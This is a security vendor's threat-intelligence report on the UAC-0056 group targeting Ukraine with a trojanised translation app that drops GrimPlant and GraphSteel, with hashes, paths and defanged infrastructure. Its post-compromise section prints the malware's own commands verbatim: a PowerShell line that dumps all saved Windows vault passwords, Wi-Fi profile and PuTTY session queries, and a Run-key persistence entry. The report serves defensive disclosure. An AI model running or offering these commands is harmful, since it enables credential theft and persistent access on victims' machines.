@@ -1,0 +1,98 @@
+<div>
+<table id="amazon-polly-audio-table">
+<tbody><tr>
+<td id="amazon-polly-audio-tab">
+</td>
+</tr>
+</tbody></table><h2 id="heading-0">Overview</h2>
+<p>SentinelOne has identified new malicious activity we assess to be closely associated with the UAC-0056 (SaintBear, UNC2589, TA471) alert, in which the threat actor was observed targeting Ukraine with Cobalt Strike, GrimPlant, and GraphSteel. This previously undiscovered set of activity centers around a Python-compiled binary that masquerades as Ukrainian language translation software, leading to the infection of GrimPlant, and GraphSteel.</p>
+<p>SentinelOne assesses UAC-0056’s GrimPlant and GraphSteel activity began in early February 2022, while preparation for its use began at least as early as December 2021.</p>
+<p><img alt="" class="aligncenter size-full wp-image-64988" height="628" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/03/Threat-Actor-UAC-0056-Targeting-Ukraine-with-Fake-Translation-Software-7.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:80%;height:auto;width:auto;" width="1200"/></p>
+<h2 id="heading-1">Dictionary Translator</h2>
+<p>SentinelOne has identified two files with names and paths correlating to the GraphSteel and GrimPlant malware referred to in the <a href="https://cert.gov.ua/article/37704" rel="noopener noreferrer" target="_blank">report by CERT-UA</a>.</p>
+<table>
+<tbody>
+<tr>
+<td>C:\Users\user\.java-sdk\microsoft-cortana.exe</td>
+<td>d77421caae67f4955529f91f229b31317dff0a95</td>
+</tr>
+<tr>
+<td>C:\Users\user\.java-sdk\oracle-java.exe</td>
+<td>ef5400f6dbf32bae79edb16c8f73a59999e605c7</td>
+</tr>
+</tbody>
+</table>
+<p>The two files identified are Go binaries dropped by the executable <code>2a60b4e1eb806f02031fe5f143c7e3b7</code> (dictionary-translator.exe). Dictionary-translator is a Python compiled binary that functions as a 45 MB translation application. Notably, this file was first uploaded to VirusTotal on February 11th 2022.</p>
+<figure class="wp-caption aligncenter" id="attachment_64967"><img alt="" class="size-full wp-image-64967" height="312" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/03/image2-1.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:80%;height:auto;width:auto;" width="1031"/><figcaption class="wp-caption-text" id="caption-attachment-64967">Translation Application</figcaption></figure>
+<p>The Dictionary-translator binary is downloaded from the potentially actor-controlled domain: <code>hxxps://dictionary-translator[.]eu/program/dictionary-translator.exe</code>.</p>
+<p>On launch, the translator application drops and executes four malicious files. These correlate to those described in the report by the Ukrainian CERT, three by name and path and one by functionality and path.</p>
+<table>
+<tbody>
+<tr>
+<td>Matched File Path</td>
+<td>UA-CERT Report Link (MD5)</td>
+</tr>
+<tr>
+<td>\Users\user\AppData\Local\Temp\tmpj43i5czq.exe</td>
+<td>15c525b74b7251cfa1f7c471975f3f95</td>
+</tr>
+<tr>
+<td>\Users\user\.java-sdk\java-sdk.exe</td>
+<td>c8bf238641621212901517570e96fae7</td>
+</tr>
+<tr>
+<td>\Users\user\.java-sdk\microsoft-cortana.exe</td>
+<td>9ea3aaaeb15a074cd617ee1dfdda2c26</td>
+</tr>
+<tr>
+<td>\Users\user\.java-sdk\oracle-java.exe</td>
+<td>4f11abdb96be36e3806bada5b8b2b8f8</td>
+</tr>
+</tbody>
+</table>
+<h2 id="heading-2">Post-Compromise Activity</h2>
+<p>Upon execution, the GraphSteel variant of the malware will run a set of reconnaissance and credential harvesting commands, again similar to those described in the report.</p>
+netsh wlan show profiles
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassword();$_} | Select UserName, Resource, Password | Format-Table -HideTableHeaders
+reg query HKCU\Software\SimonTatham\Putty\Sessions
+<p>Additionally, the malware achieves persistence by setting the current user’s registry <code>CurrentVersion\Run</code> value to execute the Go downloader at logon:</p>
+Key: HKU\%SID%\Software\Microsoft\Windows\CurrentVersion\Run\Java-SDK
+Value: \Users\user\.java-sdk\java-sdk.exe -a FIAjtW4f+IgCUrs3hfj9Lg==
+<p>The variant discovered by SentinelOne attempts to connect to a different server using a similar pattern, attempting to establish a HTTP connection over port 443 to a single character letter URI: <code>hxxp://91.242.229.35:443/i</code>.</p>
+<h2 id="heading-3">Clarification on Threat Actor UAC-0056</h2>
+<p>UAC-0056 has a history of public reporting but is most commonly known as UNC2589 (Mandiant) and TA471 (Proofpoint), among others. This actor is believed to be behind the WhisperGate activity in early January 2022 <a href="https://zetter.substack.com/p/dozens-of-computers-in-ukraine-wiped?s=r" rel="noopener noreferrer" target="_blank">impacting government agencies in Ukraine</a>. Based on our analysis, the actor was potentially building the infrastructure for the GrimPlant and GraphSteel campaign beginning in December 2021.</p>
+<figure class="wp-caption aligncenter" id="attachment_64966"><img alt="" class="size-full wp-image-64966" height="442" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/03/image1-1.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:80%;height:auto;width:auto;" width="1182"/><figcaption class="wp-caption-text" id="caption-attachment-64966">Timeline Demonstrating Known UAC-0056 Activity</figcaption></figure>
+<h2 id="heading-4">Indicators of Compromise</h2>
+<table>
+<tbody>
+<tr>
+<td>IOC / SHA1</td>
+<td>Description</td>
+</tr>
+<tr>
+<td>dictionary-translator[.]eu</td>
+<td>Dictionary-translator.exe Download Server</td>
+</tr>
+<tr>
+<td>91.242.229[.]35:443/i</td>
+<td>Go Downloader C2</td>
+</tr>
+<tr>
+<td>3eec65c8ac25682d9e7d293ca9033c8a841f4958</td>
+<td>Go Downloader</td>
+</tr>
+<tr>
+<td>d77421caae67f4955529f91f229b31317dff0a95</td>
+<td>GraphSteel Linked</td>
+</tr>
+<tr>
+<td>ef5400f6dbf32bae79edb16c8f73a59999e605c7</td>
+<td>GrimPlant Linked</td>
+</tr>
+<tr>
+<td>3847ca79b3fd52b105c5e43b7fc080aac7c5d909</td>
+<td>Dictionary-translator Program</td>
+</tr>
+</tbody>
+</table>
+</div>
